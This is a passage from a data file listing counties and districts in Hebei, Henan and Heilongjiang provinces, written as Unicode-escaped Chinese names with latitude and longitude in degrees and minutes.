"\u78C1\u53BF", "36", "21", "114", "22"], ["\u6CB3\u5317\u7701", "\u4E34\u6F33\u53BF", "36", "21", "114", "37"], ["\u6CB3\u5317\u7701", "\u6210\u5B89\u53BF", "36", "26", "114", "41"], ["\u6CB3\u5317\u7701", "\u80A5\u4E61\u53BF", "36", "33", "114", "48"], ["\u6CB3\u5317\u7701", "\u9E21\u6CFD\u53BF", "36", "55", "114", "52"], ["\u6CB3\u5317\u7701", "\u6C38\u5E74\u53BF", "36", "47", "114", "29"], ["\u6CB3\u5317\u7701", "\u90AF\u90F8\u53BF", "36", "36", "114", "32"], ["\u6CB3\u5317\u7701", "\u4EFB\u53BF", "37", "8", "114", "41"], ["\u6CB3\u5317\u7701", "\u5357\u548C\u53BF", "36", "60", "114", "41"], ["\u6CB3\u5317\u7701", "\u5185\u4E18\u53BF", "37", "18", "114", "31"], ["\u6CB3\u5317\u7701", "\u4E34\u57CE\u53BF", "37", "26", "114", "30"], ["\u6CB3\u5317\u7701", "\u9686\u5C27\u53BF", "37", "21", "114", "46"], ["\u6CB3\u5317\u7701", "\u90A2\u53F0\u53BF", "37", "5", "114", "30"], ["\u6CB3\u5317\u7701", "\u4E95\u9649\u53BF", "38", "2", "114", "8"], ["\u6CB3\u5317\u7701", "\u961C\u5E73\u53BF", "38", "51", "114", "11"], ["\u6CB3\u5317\u7701", "\u5E73\u5C71\u53BF", "38", "15", "114", "12"], ["\u6CB3\u5317\u7701", "\u7075\u5BFF\u53BF", "38", "18", "114", "22"], ["\u6CB3\u5317\u7701", "\u884C\u5510\u53BF", "38", "26", "114", "33"], ["\u6CB3\u5317\u7701", "\u66F2\u9633\u53BF", "38", "37", "114", "42"], ["\u6CB3\u5317\u7701", "\u683E\u57CE\u53BF", "37", "53", "114", "39"], ["\u6CB3\u5317\u7701", "\u6B63\u5B9A\u53BF", "38", "9", "114", "34"], ["\u6CB3\u5317\u7701", "\u8D5E\u7687\u53BF", "37", "40", "114", "23"], ["\u6CB3\u5317\u7701", "\u67CF\u4E61\u53BF", "37", "30", "114", "41"], ["\u6CB3\u5317\u7701", "\u9AD8\u9091\u53BF", "37", "36", "114", "36"], ["\u6CB3\u5317\u7701", "\u8D75\u53BF", "37", "45", "114", "46"], ["\u6CB3\u5317\u7701", "\u5143\u6C0F\u53BF", "37", "45", "114", "31"], ["\u6CB3\u5317\u7701", "\u5B81\u664B\u53BF", "37", "37", "114", "55"], ["\u6CB3\u5317\u7701", "\u65B0\u6CB3\u53BF", "37", "32", "115", "15"], ["\u6CB3\u5317\u7701", "\u65E0\u6781\u53BF", "38", "11", "114", "58"], ["\u6CB3\u5317\u7701", "\u6DF1\u6CFD\u53BF", "38", "11", "115", "12"], ["\u6CB3\u5317\u7701", "\u5510\u53BF", "38", "45", "114", "59"], ["\u6CB3\u5317\u7701", "\u671B\u90FD\u53BF", "38", "43", "115", "9"], ["\u6CB3\u5317\u7701", "\u987A\u5E73\u53BF", "38", "50", "115", "8"], ["\u6CB3\u5317\u7701", "\u6E05\u82D1\u53BF", "38", "46", "115", "29"], ["\u6CB3\u5317\u7701", "\u9AD8\u9633\u53BF", "38", "41", "115", "47"], ["\u6CB3\u5317\u7701", "\u8821\u53BF", "38", "29", "115", "34"], ["\u6CB3\u5317\u7701", "\u535A\u91CE\u53BF", "38", "27", "115", "28"], ["\u6CB3\u5317\u7701", "\u5B89\u5E73\u53BF", "38", "14", "115", "31"], ["\u6CB3\u5317\u7701", "\u9976\u9633\u53BF", "38", "14", "115", "44"], ["\u6CB3\u5317\u7701", "\u8083\u5B81\u53BF", "38", "26", "115", "50"], ["\u6CB3\u5317\u7701", "\u732E\u53BF", "38", "11", "116", "7"], ["\u6CB3\u5317\u7701", "\u961C\u57CE\u53BF", "37", "52", "116", "9"], ["\u6CB3\u5317\u7701", "\u6B66\u5F3A\u53BF", "38", "2", "115", "59"], ["\u6CB3\u5317\u7701", "\u6B66\u9091\u53BF", "37", "49", "115", "53"], ["\u6CB3\u5317\u7701", "\u67A3\u5F3A\u53BF", "37", "31", "115", "43"], ["\u6CB3\u5317\u7701", "\u666F\u53BF", "37", "42", "116", "16"], ["\u6CB3\u5317\u7701", "\u6545\u57CE\u53BF", "37", "21", "115", "58"], ["\u6CB3\u5317\u7701", "\u6E05\u6CB3\u53BF", "37", "4", "115", "40"], ["\u6CB3\u5317\u7701", "\u5DE8\u9E7F\u53BF", "37", "13", "115", "2"], ["\u6CB3\u5317\u7701", "\u5E7F\u5B97\u53BF", "37", "4", "115", "9"], ["\u6CB3\u5317\u7701", "\u5A01\u53BF", "36", "59", "115", "15"], ["\u6CB3\u5317\u7701", "\u5E73\u4E61\u53BF", "37", "4", "115", "2"], ["\u6CB3\u5317\u7701", "\u66F2\u5468\u53BF", "36", "47", "114", "57"], ["\u6CB3\u5317\u7701", "\u90B1\u53BF", "36", "49", "115", "10"], ["\u6CB3\u5317\u7701", "\u4E34\u897F\u53BF", "36", "51", "115", "30"], ["\u6CB3\u5317\u7701", "\u9986\u9676\u53BF", "36", "32", "115", "18"], ["\u6CB3\u5317\u7701", "\u5E7F\u5E73\u53BF", "36", "29", "114", "56"], ["\u6CB3\u5317\u7701", "\u9B4F\u53BF", "36", "22", "114", "56"], ["\u6CB3\u5317\u7701", "\u5927\u540D\u53BF", "36", "17", "115", "9"], ["\u6CB3\u5317\u7701", "\u6D77\u5174\u53BF", "38", "8", "117", "29"], ["\u6CB3\u5317\u7701", "\u5B5F\u6751\u56DE\u65CF\u81EA\u6CBB\u53BF", "38", "4", "117", "6"], ["\u6CB3\u5317\u7701", "\u76D0\u5C71\u53BF", "38", "3", "117", "13"], ["\u6CB3\u5317\u7701", "\u5434\u6865\u53BF", "37", "37", "116", "23"], ["\u6CB3\u5317\u7701", "\u5357\u76AE\u53BF", "38", "2", "116", "42"], ["\u6CB3\u5317\u7701", "\u4E1C\u5149\u53BF", "37", "53", "116", "32"], ["\u6CB3\u5317\u7701", "\u6CA7\u53BF", "38", "18", "116", "52"], ["\u6CB3\u5317\u7701", "\u9752\u53BF", "38", "35", "116", "49"], ["\u6CB3\u5317\u7701", "\u5927\u57CE\u53BF", "38", "42", "116", "38"], ["\u6CB3\u5317\u7701", "\u6587\u5B89\u53BF", "38", "52", "116", "28"], ["\u6CB3\u5317\u7701", "\u6C38\u6E05\u53BF", "39", "19", "116", "30"], ["\u6CB3\u5317\u7701", "\u4E50\u4EAD\u53BF", "39", "25", "118", "54"], ["\u6CB3\u5317\u7701", "\u6EE6\u5357\u53BF", "39", "30", "118", "41"], ["\u6CB3\u5317\u7701", "\u5510\u6D77\u53BF", "39", "16", "118", "27"], ["\u6CB3\u5317\u7701", "\u6EE6\u53BF", "39", "45", "118", "42"], ["\u6CB3\u5317\u7701", "\u5362\u9F99\u53BF", "39", "53", "118", "52"], ["\u6CB3\u5317\u7701", "\u8FC1\u897F\u53BF", "40", "9", "118", "19"], ["\u6CB3\u5317\u7701", "\u7389\u7530\u53BF", "39", "53", "117", "44"], ["\u6CB3\u5317\u7701", "\u627F\u5FB7\u53BF", "40", "46", "118", "10"], ["\u6CB3\u5317\u7701", "\u5BBD\u57CE\u6EE1\u65CF\u81EA\u6CBB\u53BF", "40", "36", "118", "29"], ["\u6CB3\u5317\u7701", "\u9752\u9F99\u6EE1\u65CF\u81EA\u6CBB\u53BF", "40", "24", "118", "57"], ["\u6CB3\u5317\u7701", "\u5E73\u6CC9\u53BF", "41", "0", "118", "41"], ["\u6CB3\u5317\u7701", "\u9686\u5316\u53BF", "41", "19", "117", "43"], ["\u6CB3\u5317\u7701", "\u5174\u9686\u53BF", "40", "26", "117", "31"], ["\u6CB3\u5317\u7701", "\u6EE6\u5E73\u53BF", "40", "56", "117", "20"], ["\u6CB3\u5317\u7701", "\u4E30\u5B81\u6EE1\u65CF\u81EA\u6CBB\u53BF", "41", "12", "116", "39"], ["\u6CB3\u5317\u7701", "\u6CBD\u6E90\u53BF", "41", "40", "115", "42"], ["\u6CB3\u5317\u7701", "\u5BA3\u5316\u53BF", "40", "33", "115", "1"], ["\u6CB3\u5317\u7701", "\u6DBF\u9E7F\u53BF", "40", "23", "115", "13"], ["\u6CB3\u5317\u7701", "\u6000\u6765\u53BF", "40", "24", "115", "31"], ["\u6CB3\u5317\u7701", "\u5D07\u793C\u53BF", "40", "58", "115", "16"], ["\u6CB3\u5317\u7701", "\u8D64\u57CE\u53BF", "40", "55", "115", "50"], ["\u6CB3\u5317\u7701", "\u56FA\u5B89\u53BF", "39", "26", "116", "18"], ["\u6CB3\u5317\u7701", "\u96C4\u53BF", "38", "59", "116", "6"], ["\u6CB3\u5317\u7701", "\u5B89\u65B0\u53BF", "38", "55", "115", "56"], ["\u6CB3\u5317\u7701", "\u5BB9\u57CE\u53BF", "39", "3", "115", "52"], ["\u6CB3\u5317\u7701", "\u6D9E\u6C34\u53BF", "39", "24", "115", "43"], ["\u6CB3\u5317\u7701", "\u5B9A\u5174\u53BF", "39", "16", "115", "46"], ["\u6CB3\u5317\u7701", "\u6613\u53BF", "39", "21", "115", "30"], ["\u6CB3\u5317\u7701", "\u5F90\u6C34\u53BF", "39", "1", "115", "39"], ["\u6CB3\u5317\u7701", "\u6EE1\u57CE\u53BF", "38", "57", "115", "19"], ["\u6CB3\u5317\u7701", "\u9633\u539F\u53BF", "40", "7", "114", "10"], ["\u6CB3\u5317\u7701", "\u851A\u53BF", "39", "51", "114", "34"], ["\u6CB3\u5317\u7701", "\u6D9E\u6E90\u53BF", "39", "21", "114", "41"], ["\u6CB3\u5317\u7701", "\u4E07\u5168\u53BF", "40", "45", "114", "43"], ["\u6CB3\u5317\u7701", "\u6000\u5B89\u53BF", "40", "40", "114", "25"], ["\u6CB3\u5317\u7701", "\u5C1A\u4E49\u53BF", "41", "5", "113", "58"], ["\u6CB3\u5317\u7701", "\u5F20\u5317\u53BF", "41", "9", "114", "42"], ["\u6CB3\u5317\u7701", "\u5EB7\u4FDD\u53BF", "41", "51", "114", "37"], ["\u6CB3\u5317\u7701", "\u56F4\u573A\u6EE1\u65CF\u8499\u53E4\u65CF\u81EA\u6CBB\u53BF", "41", "56", "117", "45"], ["\u6CB3\u5317\u7701", "\u629A\u5B81\u53BF", "39", "53", "119", "14"], ["\u6CB3\u5317\u7701", "\u660C\u9ECE\u53BF", "39", "42", "119", "10"], ["\u6CB3\u5357\u7701", "\u90D1\u5DDE\u5E02", "34", "45", "113", "37"], ["\u6CB3\u5357\u7701", "\u5357\u9633\u5E02", "32", "60", "112", "31"], ["\u6CB3\u5357\u7701", "\u4FE1\u9633\u5E02", "32", "8", "114", "4"], ["\u6CB3\u5357\u7701", "\u5468\u53E3\u5E02", "33", "37", "114", "39"], ["\u6CB3\u5357\u7701", "\u6F2F\u6CB3\u5E02", "33", "35", "114", "1"], ["\u6CB3\u5357\u7701", "\u9A7B\u9A6C\u5E97\u5E02", "32", "59", "114", "1"], ["\u6CB3\u5357\u7701", "\u5E73\u9876\u5C71\u5E02", "33", "46", "113", "11"], ["\u6CB3\u5357\u7701", "\u8BB8\u660C\u5E02", "34", "2", "113", "51"], ["\u6CB3\u5357\u7701", "\u7126\u4F5C\u5E02", "35", "13", "113", "15"], ["\u6CB3\u5357\u7701", "\u65B0\u4E61\u5E02", "35", "18", "113", "54"], ["\u6CB3\u5357\u7701", "\u5F00\u5C01\u5E02", "34", "48", "114", "18"], ["\u6CB3\u5357\u7701", "\u5546\u4E18\u5E02", "34", "27", "115", "39"], ["\u6CB3\u5357\u7701", "\u6FEE\u9633\u5E02", "35", "46", "115", "2"], ["\u6CB3\u5357\u7701", "\u5B89\u9633\u5E02", "36", "6", "114", "23"], ["\u6CB3\u5357\u7701", "\u9E64\u58C1\u5E02", "35", "45", "114", "17"], ["\u6CB3\u5357\u7701", "\u6D1B\u9633\u5E02", "34", "37", "112", "27"], ["\u6CB3\u5357\u7701", "\u4E09\u95E8\u5CE1\u5E02", "34", "47", "111", "12"], ["\u6CB3\u5357\u7701", "\u6C47\u5DDD\u533A", "33", "37", "114", "38"], ["\u6CB3\u5357\u7701", "\u9B4F\u90FD\u533A", "34", "2", "113", "49"], ["\u6CB3\u5357\u7701", "\u53EC\u9675\u533A", "33", "34", "114", "4"], ["\u6CB3\u5357\u7701", "\u6C47\u6E90\u533A", "33", "34", "114", "0"], ["\u6CB3\u5357\u7701", "\u90FE\u57CE\u533A", "33", "35", "113", "60"], ["\u6CB3\u5357\u7701", "\u9A7F\u57CE\u533A", "32", "58", "114", "3"], ["\u6CB3\u5357\u7701", "\u5E73\u6865\u533A", "32", "6", "114", "7"], ["\u6CB3\u5357\u7701", "\u6D49\u6CB3\u533A", "32", "7", "114", "3"], ["\u6CB3\u5357\u7701", "\u4E2D\u539F\u533A", "34", "45", "113", "36"], ["\u6CB3\u5357\u7701", "\u4E8C\u4E03\u533A", "34", "44", "113", "39"], ["\u6CB3\u5357\u7701", "\u7BA1\u57CE\u56DE\u65CF\u533A", "34", "45", "113", "40"], ["\u6CB3\u5357\u7701", "\u91D1\u6C34\u533A", "34", "47", "113", "39"], ["\u6CB3\u5357\u7701", "\u60E0\u6D4E\u533A", "34", "52", "113", "36"], ["\u6CB3\u5357\u7701", "\u4E0A\u8857\u533A", "34", "49", "113", "17"], ["\u6CB3\u5357\u7701", "\u536B\u4E1C\u533A", "33", "44", "113", "20"], ["\u6CB3\u5357\u7701", "\u65B0\u534E\u533A", "33", "44", "113", "18"], ["\u6CB3\u5357\u7701", "\u6E5B\u6CB3\u533A", "33", "44", "113", "17"], ["\u6CB3\u5357\u7701", "\u77F3\u9F99\u533A", "33", "54", "112", "53"], ["\u6CB3\u5357\u7701", "\u5367\u9F99\u533A", "32", "59", "112", "32"], ["\u6CB3\u5357\u7701", "\u5B9B\u57CE\u533A", "33", "1", "112", "33"], ["\u6CB3\u5357\u7701", "\u6E56\u6EE8\u533A", "34", "47", "111", "12"], ["\u6CB3\u5357\u7701", "\u5409\u5229\u533A", "34", "54", "112", "35"], ["\u6CB3\u5357\u7701", "\u6D1B\u9F99\u533A", "34", "37", "112", "27"], ["\u6CB3\u5357\u7701", "\u700D\u6CB3\u56DE\u65CF\u533A", "34", "41", "112", "29"], ["\u6CB3\u5357\u7701", "\u8001\u57CE\u533A", "34", "41", "112", "28"], ["\u6CB3\u5357\u7701", "\u897F\u5DE5\u533A", "34", "40", "112", "26"], ["\u6CB3\u5357\u7701", "\u6DA7\u897F\u533A", "34", "40", "112", "24"], ["\u6CB3\u5357\u7701", "\u9A6C\u6751\u533A", "35", "16", "113", "19"], ["\u6CB3\u5357\u7701", "\u5C71\u9633\u533A", "35", "13", "113", "15"], ["\u6CB3\u5357\u7701", "\u89E3\u653E\u533A", "35", "15", "113", "13"], ["\u6CB3\u5357\u7701", "\u4E2D\u7AD9\u533A", "35", "14", "113", "10"], ["\u6CB3\u5357\u7701", "\u5C71\u57CE\u533A", "35", "54", "114", "11"], ["\u6CB3\u5357\u7701", "\u9E64\u5C71\u533A", "35", "57", "114", "9"], ["\u6CB3\u5357\u7701", "\u6DC7\u6EE8\u533A", "35", "44", "114", "18"], ["\u6CB3\u5357\u7701", "\u7267\u91CE\u533A", "35", "19", "113", "54"], ["\u6CB3\u5357\u7701", "\u7EA2\u65D7\u533A", "35", "18", "113", "52"], ["\u6CB3\u5357\u7701", "\u536B\u6EE8\u533A", "35", "18", "113", "51"], ["\u6CB3\u5357\u7701", "\u51E4\u6CC9\u533A", "35", "23", "113", "55"], ["\u6CB3\u5357\u7701", "\u6587\u5CF0\u533A", "36", "5", "114", "21"], ["\u6CB3\u5357\u7701", "\u5317\u5173\u533A", "36", "7", "114", "21"], ["\u6CB3\u5357\u7701", "\u9F99\u5B89\u533A", "36", "6", "114", "19"], ["\u6CB3\u5357\u7701", "\u6BB7\u90FD\u533A", "36", "7", "114", "18"], ["\u6CB3\u5357\u7701", "\u534E\u9F99\u533A", "35", "47", "115", "4"], ["\u6CB3\u5357\u7701", "\u6C5D\u5DDE\u5E02", "34", "10", "112", "50"], ["\u6CB3\u5357\u7701", "\u9093\u5DDE\u5E02", "32", "41", "112", "5"], ["\u6CB3\u5357\u7701", "\u9879\u57CE\u5E02", "33", "27", "114", "54"], ["\u6CB3\u5357\u7701", "\u821E\u94A2\u5E02", "33", "18", "113", "31"], ["\u6CB3\u5357\u7701", "\u79B9\u5DDE\u5E02", "34", "10", "113", "28"], ["\u6CB3\u5357\u7701", "\u65B0\u5BC6\u5E02", "34", "32", "113", "23"], ["\u6CB3\u5357\u7701", "\u65B0\u90D1\u5E02", "34", "24", "113", "44"], ["\u6CB3\u5357\u7701", "\u957F\u845B\u5E02", "34", "13", "113", "46"], ["\u6CB3\u5357\u7701", "\u8365\u9633\u5E02", "34", "47", "113", "24"], ["\u6CB3\u5357\u7701", "\u8F89\u53BF\u5E02", "35", "28", "113", "48"], ["\u6CB3\u5357\u7701", "\u536B\u8F89\u5E02", "35", "24", "114", "4"], ["\u6CB3\u5357\u7701", "\u6797\u5DDE\u5E02", "36", "4", "113", "49"], ["\u6CB3\u5357\u7701", "\u6D4E\u6E90\u5E02", "35", "4", "112", "35"], ["\u6CB3\u5357\u7701", "\u6C81\u9633\u5E02", "35", "5", "112", "56"], ["\u6CB3\u5357\u7701", "\u5DE9\u4E49\u5E02", "34", "46", "112", "59"], ["\u6CB3\u5357\u7701", "\u5043\u5E08\u5E02", "34", "44", "112", "47"], ["\u6CB3\u5357\u7701", "\u767B\u5C01\u5E02", "34", "28", "113", "2"], ["\u6CB3\u5357\u7701", "\u5B5F\u5DDE\u5E02", "34", "54", "112", "47"], ["\u6CB3\u5357\u7701", "\u4E49\u9A6C\u5E02", "34", "45", "111", "52"], ["\u6CB3\u5357\u7701", "\u7075\u5B9D\u5E02", "34", "31", "110", "52"], ["\u6CB3\u5357\u7701", "\u6C38\u57CE\u5E02", "33", "55", "116", "26"], ["\u6CB3\u5357\u7701", "\u7762\u9633\u533A", "34", "23", "115", "38"], ["\u6CB3\u5357\u7701", "\u6881\u56ED\u533A", "34", "27", "115", "38"], ["\u6CB3\u5357\u7701", "\u79B9\u738B\u53F0\u533A", "34", "47", "114", "21"], ["\u6CB3\u5357\u7701", "\u91D1\u660E\u533A", "34", "47", "114", "22"], ["\u6CB3\u5357\u7701", "\u987A\u6CB3\u56DE\u65CF\u533A", "34", "48", "114", "21"], ["\u6CB3\u5357\u7701", "\u9F13\u697C\u533A", "34", "47", "114", "21"], ["\u6CB3\u5357\u7701", "\u9F99\u4EAD\u533A", "34", "48", "114", "21"], ["\u6CB3\u5357\u7701", "\u8303\u53BF", "35", "52", "115", "30"], ["\u6CB3\u5357\u7701", "\u5362\u6C0F\u53BF", "34", "3", "111", "3"], ["\u6CB3\u5357\u7701", "\u897F\u5CE1\u53BF", "33", "17", "111", "29"], ["\u6CB3\u5357\u7701", "\u683E\u5DDD\u53BF", "33", "47", "111", "37"], ["\u6CB3\u5357\u7701", "\u6DC5\u5DDD\u53BF", "33", "8", "111", "29"], ["\u6CB3\u5357\u7701", "\u5185\u4E61\u53BF", "33", "3", "111", "51"], ["\u6CB3\u5357\u7701", "\u9547\u5E73\u53BF", "33", "2", "112", "14"], ["\u6CB3\u5357\u7701", "\u5357\u53EC\u53BF", "33", "30", "112", "26"], ["\u6CB3\u5357\u7701", "\u5D69\u53BF", "34", "9", "112", "6"], ["\u6CB3\u5357\u7701", "\u6C5D\u9633\u53BF", "34", "9", "112", "28"], ["\u6CB3\u5357\u7701", "\u9C81\u5C71\u53BF", "33", "44", "112", "54"], ["\u6CB3\u5357\u7701", "\u5B9D\u4E30\u53BF", "33", "53", "113", "4"], ["\u6CB3\u5357\u7701", "\u65B9\u57CE\u53BF", "33", "16", "112", "60"], ["\u6CB3\u5357\u7701", "\u793E\u65D7\u53BF", "33", "3", "112", "56"], ["\u6CB3\u5357\u7701", "\u5510\u6CB3\u53BF", "32", "42", "112", "50"], ["\u6CB3\u5357\u7701", "\u6850\u67CF\u53BF", "32", "22", "113", "24"], ["\u6CB3\u5357\u7701", "\u65B0\u91CE\u53BF", "32", "31", "112", "21"], ["\u6CB3\u5357\u7701", "\u6CCC\u9633\u53BF", "32", "43", "113", "19"], ["\u6CB3\u5357\u7701", "\u786E\u5C71\u53BF", "32", "48", "114", "1"], ["\u6CB3\u5357\u7701", "\u6B63\u9633\u53BF", "32", "36", "114", "23"], ["\u6CB3\u5357\u7701", "\u7F57\u5C71\u53BF", "32", "12", "114", "32"], ["\u6CB3\u5357\u7701", "\u65B0\u53BF", "31", "38", "114", "52"], ["\u6CB3\u5357\u7701", "\u5149\u5C71\u53BF", "32", "1", "114", "54"], ["\u6CB3\u5357\u7701", "\u5546\u57CE\u53BF", "31", "48", "115", "24"], ["\u6CB3\u5357\u7701", "\u56FA\u59CB\u53BF", "32", "11", "115", "41"], ["\u6CB3\u5357\u7701", "\u65B0\u8521\u53BF", "32", "45", "114", "59"], ["\u6CB3\u5357\u7701", "\u6DEE\u6EE8\u53BF", "32", "26", "115", "24"], ["\u6CB3\u5357\u7701", "\u6F62\u5DDD\u53BF", "32", "8", "115", "2"], ["\u6CB3\u5357\u7701", "\u606F\u53BF", "32", "21", "114", "44"], ["\u6CB3\u5357\u7701", "\u5E73\u8206\u53BF", "32", "58", "114", "38"], ["\u6CB3\u5357\u7701", "\u6C88\u4E18\u53BF", "33", "24", "115", "4"], ["\u6CB3\u5357\u7701", "\u9E7F\u9091\u53BF", "33", "52", "115", "29"], ["\u6CB3\u5357\u7701", "\u67D8\u57CE\u53BF", "34", "4", "115", "18"], ["\u6CB3\u5357\u7701", "\u592A\u5EB7\u53BF", "34", "4", "114", "51"], ["\u6CB3\u5357\u7701", "\u90F8\u57CE\u53BF", "33", "39", "115", "12"], ["\u6CB3\u5357\u7701", "\u6DEE\u9633\u53BF", "33", "44", "114", "53"], ["\u6CB3\u5357\u7701", "\u5546\u6C34\u53BF", "33", "32", "114", "36"], ["\u6CB3\u5357\u7701", "\u897F\u534E\u53BF", "33", "48", "114", "32"], ["\u6CB3\u5357\u7701", "\u6276\u6C9F\u53BF", "34", "4", "114", "23"], ["\u6CB3\u5357\u7701", "\u9122\u9675\u53BF", "34", "6", "114", "12"], ["\u6CB3\u5357\u7701", "\u4E34\u988D\u53BF", "33", "49", "113", "56"], ["\u6CB3\u5357\u7701", "\u6C5D\u5357\u53BF", "33", "0", "114", "21"], ["\u6CB3\u5357\u7701", "\u9042\u5E73\u53BF", "33", "9", "113", "60"], ["\u6CB3\u5357\u7701", "\u4E0A\u8521\u53BF", "33", "16", "114", "16"], ["\u6CB3\u5357\u7701", "\u897F\u5E73\u53BF", "33", "23", "114", "1"], ["\u6CB3\u5357\u7701", "\u821E\u9633\u53BF", "33", "26", "113", "36"], ["\u6CB3\u5357\u7701", "\u53F6\u53BF", "33", "37", "113", "21"], ["\u6CB3\u5357\u7701", "\u8BB8\u660C\u53BF", "34", "0", "113", "50"], ["\u6CB3\u5357\u7701", "\u8944\u57CE\u53BF", "33", "51", "113", "29"], ["\u6CB3\u5357\u7701", "\u90CF\u53BF", "33", "58", "113", "13"], ["\u6CB3\u5357\u7701", "\u4FEE\u6B66\u53BF", "35", "14", "113", "26"], ["\u6CB3\u5357\u7701", "\u6B66\u965F\u53BF", "35", "6", "113", "23"], ["\u6CB3\u5357\u7701", "\u83B7\u5609\u53BF", "35", "16", "113", "39"], ["\u6CB3\u5357\u7701", "\u65B0\u4E61\u53BF", "35", "12", "113", "48"], ["\u6CB3\u5357\u7701", "\u5EF6\u6D25\u53BF", "35", "9", "114", "12"], ["\u6CB3\u5357\u7701", "\u6DC7\u53BF", "35", "36", "114", "12"], ["\u6CB3\u5357\u7701", "\u6ED1\u53BF", "35", "35", "114", "31"], ["\u6CB3\u5357\u7701", "\u5C01\u4E18\u53BF", "35", "3", "114", "25"], ["\u6CB3\u5357\u7701", "\u5F00\u5C01\u53BF", "34", "46", "114", "26"], ["\u6CB3\u5357\u7701", "\u539F\u9633\u53BF", "35", "3", "113", "58"], ["\u6CB3\u5357\u7701", "\u4E2D\u725F\u53BF", "34", "43", "113", "58"], ["\u6CB3\u5357\u7701", "\u5C09\u6C0F\u53BF", "34", "25", "114", "11"], ["\u6CB3\u5357\u7701", "\u901A\u8BB8\u53BF", "34", "29", "114", "28"], ["\u6CB3\u5357\u7701", "\u675E\u53BF", "34", "33", "114", "47"], ["\u6CB3\u5357\u7701", "\u5170\u8003\u53BF", "34", "49", "114", "49"], ["\u6CB3\u5357\u7701", "\u6C11\u6743\u53BF", "34", "39", "115", "8"], ["\u6CB3\u5357\u7701", "\u7762\u53BF", "34", "27", "115", "4"], ["\u6CB3\u5357\u7701", "\u5B81\u9675\u53BF", "34", "27", "115", "19"], ["\u6CB3\u5357\u7701", "\u865E\u57CE\u53BF", "34", "24", "115", "51"], ["\u6CB3\u5357\u7701", "\u957F\u57A3\u53BF", "35", "12", "114", "41"], ["\u6CB3\u5357\u7701", "\u5185\u9EC4\u53BF", "35", "57", "114", "54"], ["\u6CB3\u5357\u7701", "\u5357\u4E50\u53BF", "36", "5", "115", "12"], ["\u6CB3\u5357\u7701", "\u6E05\u4E30\u53BF", "35", "54", "115", "7"], ["\u6CB3\u5357\u7701", "\u6FEE\u9633\u53BF", "35", "42", "115", "1"], ["\u6CB3\u5357\u7701", "\u53F0\u524D\u53BF", "35", "60", "115", "51"], ["\u6CB3\u5357\u7701", "\u5B89\u9633\u53BF", "36", "6", "114", "21"], ["\u6CB3\u5357\u7701", "\u6D5A\u53BF", "35", "40", "114", "33"], ["\u6CB3\u5357\u7701", "\u6C64\u9634\u53BF", "35", "55", "114", "21"], ["\u6CB3\u5357\u7701", "\u535A\u7231\u53BF", "35", "10", "113", "4"], ["\u6CB3\u5357\u7701", "\u6E29\u53BF", "34", "56", "113", "5"], ["\u6CB3\u5357\u7701", "\u5B5F\u6D25\u53BF", "34", "50", "112", "26"], ["\u6CB3\u5357\u7701", "\u65B0\u5B89\u53BF", "34", "43", "112", "9"], ["\u6CB3\u5357\u7701", "\u4F0A\u5DDD\u53BF", "34", "25", "112", "25"], ["\u6CB3\u5357\u7701", "\u5B9C\u9633\u53BF", "34", "31", "112", "10"], ["\u6CB3\u5357\u7701", "\u6E11\u6C60\u53BF", "34", "46", "111", "45"], ["\u6CB3\u5357\u7701", "\u6D1B\u5B81\u53BF", "34", "23", "111", "39"], ["\u6CB3\u5357\u7701", "\u9655\u53BF", "34", "42", "111", "5"], ["\u6CB3\u5357\u7701", "\u590F\u9091\u53BF", "34", "14", "116", "8"], ["\u9ED1\u9F99\u6C5F\u7701", "\u54C8\u5C14\u6EE8\u5E02", "45", "48", "126", "32"], ["\u9ED1\u9F99\u6C5F\u7701", "\u5927\u5174\u5B89\u5CAD\u5730\u533A", "50", "25", "124", "7"], ["\u9ED1\u9F99\u6C5F\u7701", "\u9F50\u9F50\u54C8\u5C14\u5E02", "47", "20", "123", "57"], ["\u9ED1\u9F99\u6C5F\u7701", "\u5927\u5E86\u5E02", "46", "35", "125", "2"], ["\u9ED1\u9F99\u6C5F\u7701", "\u7261\u4E39\u6C5F\u5E02", "44", "35", "129", "36"], ["\u9ED1\u9F99\u6C5F\u7701", "\u9E21\u897F\u5E02", "45", "18", "130", "58"], ["\u9ED1\u9F99\u6C5F\u7701", "\u4E03\u53F0\u6CB3\u5E02", "45", "47", "130", "57"], ["\u9ED1\u9F99\u6C5F\u7701", "\u4F73\u6728\u65AF\u5E02", "46", "49", "130", "22"], ["\u9ED1\u9F99\u6C5F\u7701", "\u9E64\u5C97\u5E02", "47", "20", "130", "16"], ["\u9ED1\u9F99\u6C5F\u7701", "\u53CC\u9E2D\u5C71\u5E02", "46", "38", "131", "9"], ["\u9ED1\u9F99\u6C5F\u7701", "\u4F0A\u6625\u5E02", "47", "44", "128", "54"], ["\u9ED1\u9F99\u6C5F\u7701", "\u7EE5\u5316\u5E02", "46", "38", "126", "59"], ["\u9ED1\u9F99\u6C5F\u7701", "\u9ED1\u6CB3\u5E02", "50", "15", "127", "29"], ["\u9ED1\u9F99\u6C5F\u7701", "\u65B0\u6797\u533A", "51", "41", "124", "24"], ["\u9ED1\u9F99\u6C5F\u7701", "\u547C\u4E2D\u533A", "52", "2", "123", "36"], ["\u9ED1\u9F99\u6C5F\u7701", "\u6602\u6602\u6EAA\u533A", "47", "9", "123", "48"], ["\u9ED1\u9F99\u6C5F\u7701", "\u5BCC\u62C9\u5C14\u57FA\u533A", "47", "12", "123", "37"], ["\u9ED1\u9F99\u6C5F\u7701", "\u9F99\u6C99\u533A", "47", "19", "123", "57"], ["\u9ED1\u9F99\u6C5F\u7701", "\u5EFA\u534E\u533A", "47", "21", "123", "57"], ["\u9ED1\u9F99\u6C5F\u7701", "\u94C1\u950B\u533A", "47", "21", "123", "59"], ["\u9ED1\u9F99\u6C5F\u7701", "\u7231\u8F89\u533A", "50", "15", "127", "29"], ["\u9ED1\u9F99\u6C5F\u7701", "\u5317\u6797\u533A", "46", "38", "126", "59"], ["\u9ED1\u9F99\u6C5F\u7701", "\u5927\u540C\u533A", "46", "2", "124", "49"], ["\u9ED1\u9F99\u6C5F\u7701", "\u7EA2\u5C97\u533A", "46", "24", "124", "53"], ["\u9ED1\u9F99\u6C5F\u7701", "\u9F99\u51E4\u533A", "46", "32", "125", "6"], ["\u9ED1\u9F99\u6C5F\u7701", "\u8428\u5C14\u56FE\u533A", "46", "36", "125", "1"], ["\u9ED1\u9F99\u6C5F\u7701", "\u8BA9\u80E1\u8DEF\u533A", "46", "39", "124", "51"], ["\u9ED1\u9F99\u6C5F\u7701", "\u5E73\u623F\u533A", "45", "37", "126", "37"], ["\u9ED1\u9F99\u6C5F\u7701", "\u9999\u574A\u533A", "45", 